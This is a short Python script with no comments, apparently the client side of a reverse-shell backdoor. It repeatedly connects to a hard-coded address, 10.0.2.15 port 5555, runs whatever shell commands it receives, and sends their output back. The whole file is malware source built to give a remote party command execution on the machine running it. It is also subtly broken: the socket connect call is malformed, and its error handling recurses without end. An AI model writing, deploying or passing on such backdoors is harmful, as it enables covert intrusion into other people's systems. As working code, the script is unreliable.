import socket
import time
import json
import subprocess


def sender(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def receiver():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect("10.0.2.15", 5555)
            shell()
            sock.close()
            break
        except:
            connection()


def shell():
    while True:
        command = receiver()
        if command == "quit":
            break
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            sender(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
